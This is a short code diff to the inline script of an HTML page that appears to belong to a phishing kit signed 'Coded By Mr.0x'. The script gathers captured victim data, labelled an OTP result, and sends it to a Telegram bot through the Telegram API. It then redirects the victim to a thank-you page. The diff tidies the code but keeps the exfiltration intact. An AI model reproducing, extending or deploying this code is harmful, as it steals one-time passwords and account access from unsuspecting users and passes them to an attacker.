@@ -28,6 +28,7 @@
     <script src="config/email.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
     <script>
+        // Same helpers as index.html (or you can put them in a shared .js file)
         async function sendTelegram(message) {
             try {
                 const res = await fetch(`https://api.telegram.org/bot${CONFIG.apikey}/sendMessage`, {
@@ -81,9 +82,8 @@
                 message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
                 message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
 
-                const result = await sendTelegram(message);
-                console.log('OTP Telegram result:', result);
-
+                await sendTelegram(message);
+                // Redirect to thank-you page
                 window.location.href = 'thank.html';
             });
         });
